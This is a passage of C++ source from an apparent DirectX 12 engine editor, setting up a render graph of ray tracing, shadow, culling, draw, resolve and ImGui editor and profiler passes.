				mAppState->mGfxProfiler->BeginProfile(context, ""DXRPass"");
				mRaytracerPassHW->SetSources(mAppState->mScene);
				mRaytracerPassHW->Process(mRenderer->Heap(), context, mCamera.Read(), mAppState->mViewportWidth, mAppState->mViewportHeight);
				mAppState->mGfxProfiler->EndProfile(context, ""DXRPass"");

				context->Finish();
			});
	}
	else
	{
		// Compute ray tracer - acceleration structure generator
		mAccelerationNode = new Engine::ComputeGraphNode(""RayTracing::AccelerationStructure"", eventSystem, [&]() -> void
			{
				// TODO: Rebuild/refit TLAS here when needed (with re-initializing data from scene)
			});

		// Compute ray tracer - ray generator
		mRaygenNode = new Engine::ComputeGraphNode(""RayTracing::Raygen"", eventSystem, [&]() -> void
			{
				Engine::ComputeContext* context = mRenderer->GetComputeContext();

				context->Begin();

				mAppState->mGfxProfiler->BeginProfile(context, ""RayTracing::Raygen"");
				mAppState->mRaytracer->GetRayGenerator()->InitPrimaryRaysDevice(mAppState->mRaytracer->GetRayBuffer(mAppState->mPrimaryRayBuffer), context, mRenderer->Heap(), mCamera.Read(), mAppState->mViewportWidth, mAppState->mViewportHeight);
				mAppState->mGfxProfiler->EndProfile(context, ""RayTracing::Raygen"");

				context->Finish();
			});

		// Compute ray tracer - trace rays
		mRaytraceNode = new Engine::ComputeGraphNode(""RayTracing::Trace"", eventSystem, [&]() -> void
			{
				Engine::ComputeContext* context = mRenderer->GetComputeContext();

				context->Begin();

				mAppState->mGfxProfiler->BeginProfile(context, ""RayTracing::Trace"");
				mRaytracerPass->SetSources(mAppState->mPrimaryRayBuffer);
				mRaytracerPass->Process(mRenderer->Heap(), context, mAppState->mRenderNodes->GetBounds());
				mAppState->mGfxProfiler->EndProfile(context, ""RayTracing::Trace"");

				context->Finish();
			});
		mRaytraceNode->AddInput(mAccelerationNode);
		mRaytraceNode->AddInput(mRaygenNode);
	}

	// Prepare scenegraph render nodes into buffer (for rendering)
	mRenderNodesNode = new Engine::ComputeGraphNode(""Renderer::RenderNodesPass"", eventSystem, [&]() -> void
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();

			context->Begin();

			mAppState->mRenderNodes->Process(context);

			context->Finish();
		});

	// Prepare material systems data into buffer (for rendering)
	mMaterialNode = new Engine::ComputeGraphNode(""Renderer::MaterialPass"", eventSystem, [&]() -> void
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();

			context->Begin();

			// If anything in editor was changed - check whether the object has material component, if it has - material system needs to be updated for this change
			if (mAppState->mEditor->GetChangedFlag())
			{
				std::set<int> ids = mAppState->mScene->GetState()->GetSelection();
				for (std::set<int>::iterator it = ids.begin(); it != ids.end(); it++)
				{
					Engine::Entity* entity = mAppState->mScene->GetEntity(*it);
					if (entity->GameObject().Has<Engine::MaterialComponent>())
					{
						Engine::MaterialComponent* materialComponent = entity->GameObject().Get<Engine::MaterialComponent>();
						int materialID = materialComponent->GetMaterialID();

						SkyeCuillin::MaterialSystem::Material* material = mAppState->mMaterialSystem->GetMaterial(materialID);

						material->mDiffuseMap = materialComponent->GetDiffuseMap()->GetSRVIndex();
						if (material->mDiffuseMap == (unsigned int)-1)
						{
							material->mDiffuseMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::DIFFUSE]->GetSRVIndex();
						}

						material->mNormalsMap = materialComponent->GetNormalsMap()->GetSRVIndex();
						if (material->mNormalsMap == (unsigned int)-1)
						{
							material->mNormalsMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::NORMAL]->GetSRVIndex();
						}

						material->mMetallicMap = materialComponent->GetMetallicMap()->GetSRVIndex();
						if (material->mMetallicMap == (unsigned int)-1)
						{
							material->mMetallicMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::METALLIC]->GetSRVIndex();
						}

						material->mRoughnessMap = materialComponent->GetRoughnessMap()->GetSRVIndex();
						if (material->mRoughnessMap == (unsigned int)-1)
						{
							material->mRoughnessMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::ROUGHNESS]->GetSRVIndex();
						}

						mAppState->mMaterialSystem->UpdateMaterial(materialID);
					}
				}
			}

			mAppState->mMaterialSystem->Process(context);

			context->Finish();
		});

	// Render all shadow maps in lighting system that need to be updated
	mShadowRenderNode = new Engine::ComputeGraphNode(""Renderer::ShadowPass"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""ShadowPass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				break;

			case Application::ViewportState::TEXTURED:
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mLightingSystem->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mAppState->mRenderNodes->GetBounds());
				break;

			default:
				break;
			}
			mAppState->mGfxProfiler->EndProfile(context, ""ShadowPass"");

			context->Finish();
		});
	mShadowRenderNode->AddInput(mRenderNodesNode);
	mShadowRenderNode->AddInput(mMaterialNode);

	mCullingNode = new Engine::ComputeGraphNode(""Renderer::Culling"", eventSystem, [&]() -> void
		{
			if (mCamera.Read() == nullptr)
			{
				return;
			}

			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""CullPassHiZ"");
			mCulling->SetBuffers(mAppState->mRenderNodes, mCamera.Read()->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER, mCamera.Read());
			mCulling->Process(mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""CullPassHiZ"");

			mAppState->mGfxProfiler->BeginProfile(context, ""Hi-ZPass1"");
			//mHiZPass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
			mAppState->mGfxProfiler->EndProfile(context, ""Hi-ZPass1"");

			mAppState->mGfxProfiler->BeginProfile(context, ""Hi-ZPass2"");
			//mHiZPass->Process2(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
			mAppState->mGfxProfiler->EndProfile(context, ""Hi-ZPass2"");

			mAppState->mGfxProfiler->BeginProfile(context, ""CullPass"");
			// Occlusion culling
			//mCulling->SetBuffers(mAppState->mRenderNodes, mCamera.Read()->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER, mCamera.Read(), mHiZPass->GetWidth(), mHiZPass->GetHeight(), mHiZPass->GetNumMiplevels());
			//mCulling->Process(mRenderer->Heap(), context, Engine::Culling::DEFAULT_CULLING_BUFFER, mHiZPass->GetBuffer());
			// Uncomment for Frustum culling only
			mCulling->SetBuffers(mAppState->mRenderNodes, mCamera.Read()->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER);
			mCulling->Process(mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""CullPass"");

			context->Finish();
		});
	mCullingNode->AddInput(mRenderNodesNode);
	mCullingNode->AddInput(mMaterialNode);

	mDrawNode = new Engine::ComputeGraphNode(""Renderer::DrawPass"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""DrawPass"");

			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mWireframePass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mCulling);
				break;

			case Application::ViewportState::TEXTURED:
				mTexturedPass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mGBufferPass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
				break;

			default:
				break;
			}

			mAppState->mGfxProfiler->EndProfile(context, ""DrawPass"");

			context->Finish();
		});
	mDrawNode->AddInput(mRenderNodesNode);
	mDrawNode->AddInput(mMaterialNode);
	mDrawNode->AddInput(mCullingNode);

	mReductionNode = new Engine::ComputeGraphNode(""Renderer::ReductionPass"", eventSystem, [&]() -> void
		{
			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""ReductionPass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mMultisampling->SetSources(mWireframePass->GetBuffer(), mWireframePass->GetDepthBuffer());
				break;

			case Application::ViewportState::TEXTURED:
				mMultisampling->SetSources(mTexturedPass->GetBuffer(), mTexturedPass->GetDepthBuffer());
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mMultisampling->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER), mGBufferPass->GetDepthBuffer());
				break;

			default:
				break;
			}
			mMultisampling->Process(mCamera.Read(), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""ReductionPass"");

			context->Finish();
		});
	mReductionNode->AddInput(mDrawNode);

	mResolveNode = new Engine::ComputeGraphNode(""Renderer::ResolvePass"", eventSystem, [&]() -> void
		{
			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""ResolvePass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mResolve->SetSources(mWireframePass->GetBuffer(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				break;

			case Application::ViewportState::TEXTURED:
				mResolve->SetSources(mTexturedPass->GetBuffer(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				break;

			case Application::ViewportState::LIT_TEXTURED:
				mLightingPass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::DEPTH_BUFFER),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTiles(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples());
				mLightingPass->Process(mCamera.Read(), mRenderer->Heap(), context);

				mAvgLuminance->SetSources(mLightingPass->GetOutput(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				mAvgLuminance->Process(mRenderer->Heap(), context, mAppState->mGfxProfiler->GetFrameTime());

				mResolve->SetSources(mLightingPass->GetOutput(),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mMultisampling->GetTiles(),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples(),
					mAvgLuminance->GetAvgLuminanceBuffer());
				break;

			case Application::ViewportState::LIT:
				mLightingPass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::DEPTH_BUFFER),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTiles(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples());
				mLightingPass->Process(mCamera.Read(), mRenderer->Heap(), context, Engine::LightingPass::Mode::LIT);

				mAvgLuminance->SetSources(mLightingPass->GetOutput(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				mAvgLuminance->Process(mRenderer->Heap(), context, mAppState->mGfxProfiler->GetFrameTime());

				mResolve->SetSources(mLightingPass->GetOutput(),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mMultisampling->GetTiles(),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples(),
					mAvgLuminance->GetAvgLuminanceBuffer());
				break;

			default:
				break;
			}
			mResolve->Process(mCamera.Read(), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""ResolvePass"");

			context->Finish();
		});
	mResolveNode->AddInput(mShadowRenderNode);
	mResolveNode->AddInput(mReductionNode);

	mRenderNode = new Engine::ComputeGraphNode(""Rendering"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);
			std::lock_guard<std::mutex> swapChainLock(mAppState->mSwapChainMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();			

			mAppState->SetGraphicsContext(context);

			mAppState->mGfxProfiler->Reset(context);
			mAppState->mGfxProfiler->BeginProfile(context, ""Frame"");

			// No native resolve pass
			/*mAppState->mGfxProfiler->BeginProfile(context, ""NativeResolve"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mNativeResolvePass->SetSources(mWireframePass->GetBuffer(), mWireframePass->GetDepthBuffer());
				break;

			case Application::ViewportState::TEXTURED:
				mNativeResolvePass->SetSources(mTexturedPass->GetBuffer(), mTexturedPass->GetDepthBuffer());
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mNativeResolvePass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER), mGBufferPass->GetDepthBuffer());
				break;

			default:
				break;
			}
			mNativeResolvePass->Process(mCamera.Read(), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""NativeResolve"");*/

			// No gizmo pass
			/*context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_RENDER_TARGET, true);
			context->SetRenderTargets(mSwapChain->GetBackBuffer(), mSwapChain->GetDepthBuffer());
			context->SetViewport(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->SetScissorRect(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->ClearColor(mSwapChain->GetBackBuffer(), 0.0f, 0.0f, 0.0f, 1.0f);
			context->ClearDepth(mSwapChain->GetDepthBuffer(), 1.0f, 0);

			std::set<int> ids;
			Engine::float4 basis[3] = { Engine::float4(1.0f, 0.0f, 0.0f, 1.0f), Engine::float4(0.0f, 1.0f, 0.0f, 1.0f), Engine::float4(0.0f, 0.0f, 1.0f, 1.0f) };
			mGizmoPass->Clear();
			//mGizmoPass->Process(nodes, mAppState->mScene, mMatricesBuffer, ids);
			//mGizmoPass->ProcessIcons(nodes);
			mGizmoPass->AddTranslationAxis(Engine::float4(0.0f, 0.0f, 0.0f, 1.0f), basis, 10.0f, -1, -1);
			mGizmoPass->Render(mCamera.Read(), mRenderer->Heap(), context);*/
			
			// Set output to back buffer - and perform imgui pass (output)
			context->SetDescriptorHeap(Engine::DescriptorHeap::CBV_SRV_UAV, mRenderer->Heap());
			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_RENDER_TARGET, true);
			context->SetRenderTargets(mSwapChain->GetBackBuffer(), mSwapChain->GetDepthBuffer());
			context->SetViewport(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->SetScissorRect(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->ClearColor(mSwapChain->GetBackBuffer(), 0.0f, 0.0f, 0.0f, 1.0f);
			context->ClearDepth(mSwapChain->GetDepthBuffer(), 1.0f, 0);

			// Draw Imgui user interface
			mImgui->Update(context, mAppState->mGfxProfiler->GetFrameTime() * 0.001f);
			mImgui->NewFrame();

			mAppState->mMenuUI->Process(mAppState->mWindowSize);


			// Create root imgui window for dockspace
			ImGuiViewport* viewport = ImGui::GetMainViewport();
			ImGui::SetNextWindowPos(ImVec2(0.0f, 0.0f));
			ImGui::SetNextWindowSize(ImVec2((float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y));
			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			ImGui::Begin(""Viewport"", nullptr, ImGuiWindowFlags_MenuBar | ImGuiWindowFlags_NoDocking | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBringToFrontOnFocus | ImGuiWindowFlags_NoNavFocus | ImGuiWindowFlags_NoBackground);
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGuiID dockspace = ImGui::GetID(""Dockspace"");
			ImGui::DockSpace(dockspace, ImVec2(0.0f, 0.0f), ImGuiDockNodeFlags_None | ImGuiDockNodeFlags_PassthruCentralNode);

			mAppState->mEditorSettingsDialog->Process();

			ImGui::End();

			unsigned int regionWidth = mAppState->mWindowSize.x;
			unsigned int regionHeight = mAppState->mWindowSize.y;

			if (ImGui::Begin(""Debug""))
			{
				//ImGui::Image((ImTextureID)(mGBufferPass->GetBuffer(0)->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mWireframePass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mTexturedPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mNativeResolvePass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				if (mAppState->GetViewportState() == Application::ViewportState::LIT_TEXTURED || mAppState->GetViewportState() == Application::ViewportState::LIT)
				{
					//ImGui::Image((ImTextureID)(mLightingSystem->GetShadowMap()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
					ImGui::Image((ImTextureID)(mResolve->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}
				else
				{
					//ImGui::Image((ImTextureID)(mHiZPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());				
					//ImGui::Image((ImTextureID)(mRaytracerPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
					ImGui::Image((ImTextureID)(mResolve->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}

				ImVec2 regionMin = ImGui::GetWindowContentRegionMin();
				ImVec2 regionMax = ImGui::GetWindowContentRegionMax();

				regionWidth = (unsigned int)(regionMax.x - regionMin.x);
				regionHeight = (unsigned int)(regionMax.y - regionMin.y);

				if (regionWidth < 8)
				{
					regionWidth = 8;
				}

				if (regionWidth > 4096)
				{
					regionWidth = 4096;
				}

				if (regionHeight < 8)
				{
					regionHeight = 8;
				}

				if (regionHeight > 4096)
				{
					regionHeight = 4096;
				}
			}
			ImGui::End();

			if (mUseHardwareRaytracing)
			{
				if (ImGui::Begin(""Debug2""))
				{
					ImGui::Image((ImTextureID)(mRaytracerPassHW->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}
				ImGui::End();
			}
			else
			{
				if (ImGui::Begin(""Debug2""))
				{
					ImGui::Image((ImTextureID)(mRaytracerPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}
				ImGui::End();
			}

			if (ImGui::Begin(""Debug3""))
			{
				ImGui::Image((ImTextureID)(mLightingSystem->GetShadowMap()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
			}
			ImGui::End();

			if (ImGui::Begin(""Histogram""))
			{
				if (ImPlot::BeginPlot(""Histogram""))
				{
					float data[256];
					for (int i = 0; i < 256; i++)
					{
						data[i] = (float)(mAvgLuminance->GetHistogramHostBuffer()[i]);
					}

					ImPlot::SetupAxisScale(ImAxis_X1, ImPlotScale_Linear);
					ImPlot::SetupAxisLimits(ImAxis_X1, 0.0, 256.0);
					ImPlot::SetupAxisScale(ImAxis_Y1, ImPlotScale_Linear);
					ImPlot::SetupAxisLimits(ImAxis_Y1, 0.0, 1024.0);
					ImPlot::PlotLine(""Buckets"", data, 256);
					ImPlot::EndPlot();
				}
			}
			ImGui::End();

			if (ImGui::Begin(""AverageLuminance""))
			{
				ImGui::LabelText(""Average Luminance"", ""%f"", mAvgLuminance->GetAvgLuminanceHostBuffer()[0]);
				ImGui::LabelText(""Exposure"", ""%f"", mAvgLuminance->GetAvgLuminanceHostBuffer()[1]);
			}
			ImGui::End();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Scenegraph"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mEditorScenegraph->ImguiScenegraphEditor();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Edit"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mEditorComponent->ImguiSelectionEditor();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Directory View"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mDirTree->Imgui();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			if (Engine::ComponentStatic::mEditedComponent != nullptr)
			{
				mAppState->mEditorManager->ImguiManagerList<Engine::Texture>(""Select Texture"", mAppState->mAssetManager->GetManager<Engine::Texture>());
			}

			static bool showProfiler = true;
			if (ImGui::Begin(""Profile"", &showProfiler))
			{
				char tmp[255] = { 0 };
				snprintf(tmp, sizeof(tmp), ""%f fps"", mAppState->mGfxProfiler->GetFramesPerSecond()); ImGui::LabelText(""FPS"", tmp);

				ImGui::Separator();

				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Frame"")); ImGui::LabelText(""Frame"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ShadowPass"")); ImGui::LabelText(""ShadowPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Hi-ZPass1"")); ImGui::LabelText(""Hi-ZPass1"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Hi-ZPass2"")); ImGui::LabelText(""Hi-ZPass2"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""CullPass"")); ImGui::LabelText(""CullPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""CullPassHiZ"")); ImGui::LabelText(""CullPassHiZ"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""DrawPass"")); ImGui::LabelText(""DrawPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ReductionPass"")); ImGui::LabelText(""ReductionPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ResolvePass"")); ImGui::LabelText(""ResolvePass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""NativeResolve"")); ImGui::LabelText(""NativeResolve"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""RayTracing::Raygen"")); ImGui::LabelText(""RayTracing::Raygen"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""RayTracing::Trace"")); ImGui::LabelText(""RayTracing::Trace"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""DXRPass"")); ImGui::LabelText(""DXRPass"", tmp);
			}
			ImGui::End();

			mImgui->Render();

			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_PRESENT, true);

			mAppState->mGfxProfiler->EndProfile(context, ""Frame"");
			mAppState->mGfxProfiler->Resolve(context);

			mAppState->ReleaseGraphicsContext();

			// Finish recording command list, execute command list and wait for execution
			uint64_t fence = context->Finish();

			if (mAppState->mEditorSettingsDialog->IsChanged())
			{
				mAppState->mEditorSettingsDialog->ClearChanged();
				mImgui->SetupFonts(mRenderer);
			}

			mAvgLuminance->Readback();

			mTexturedPass->Readback();

			if (mAppState->mViewportWidth != regionWidth && mAppState->mViewportHeight != regionHeight)
			{
				mAppState->mViewportWidth = regionWidth;
				mAppState->mViewportHeight = regionHeight;

				mAppState->mResizeFlag = true;

				mWireframePass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mTexturedPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mGBufferPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				//mNativeResolvePass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mMultisampling->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mResolve->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mLightingPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				if (mUseHardwareRaytracing)
				{
					mRaytracerPassHW->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				}
				else
				{
					mRaytracerPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				}
				mHiZPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);

				if (mUseHardwareRaytracing == false)
				{
					mAppState->mRaytracer->ResizeRayBuffer(mAppState->mPrimaryRayBuffer, mAppState->mViewportWidth* mAppState->mViewportHeight);
				}
			}
			else
			{
				mAppState->mResizeFlag = false;
			}

			if (mAppState->mBaseSignatureChanged == true)
			{
				mAppState->mBaseSignatureChanged = false;

				delete mAppState->mRenderNodes;
				switch (mAppState->GetViewportState())
				{
				case Application::ViewportState::WIREFRAME:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mWireframePass->GetRootSignature(), nullptr, mHiZPass->GetRootSignature() });
					break;

				case Application::ViewportState::TEXTURED:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature(), nullptr, mHiZPass->GetRootSignature() });
					break;

				case Application::ViewportState::LIT_TEXTURED:
				case Application::ViewportState::LIT:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mGBufferPass->GetRootSignature(), mLightingSystem->GetRootSignature(), mHiZPass->GetRootSignature() });
					break;

				default:
					break;
				}
			}

			mAppState->mGfxProfiler->Process(""Frame"");

			// Swap buffers in swap chain and present to screen
			mSwapChain->SwapBuffers();

			if (mCamera.Read() != nullptr)
			{
				mAppState->mScene->Render(mRenderer, mCamera.Read(), mAppState->mRenderNodes);
			}

			mCamera.Write(mAppState->mScene->GetEntity(""Camera"")->GameObject().Get<Engine::CameraComponent>()->GetCamera());
			mCamera.Swap();
		});
	mRenderNode->AddInput(mResolveNode);
	if (mUseHardwareRaytracing)
	{
		mRenderNode->AddInput(mRaytraceHWNode);
	}
	else
	{
		mRenderNode->AddInput(mRaytraceNode);
	}

	// Add render nodes into pipeline
	if (mUseHardwareRaytracing)
	{
		mPipeline->AddNode(mRaytraceHWNode);
	}
	else
	{
		mPipeline->AddNode(mAccelerationNode);
		mPipeline->AddNode(mRaygenNode);
		mPipeline->AddNode(mRaytraceNode);
	}
	mPipeline->AddNode(mRenderNodesNode);
	mPipeline->AddNode(mMaterialNode);
	mPipeline->AddNode(mShadowRenderNode);
	mPipeline->AddNode(mCullingNode);
	mPipeline->AddNode(mDrawNode);
	mPipeline->AddNode(mReductionNode);
	mPipeline->AddNode(mResolveNode);
	mPipeline->AddNode(mRenderNode);

	mPipeline->Start();

	// Register events implemented on this class
	Engine::EventChannel chan(mEventSystem);
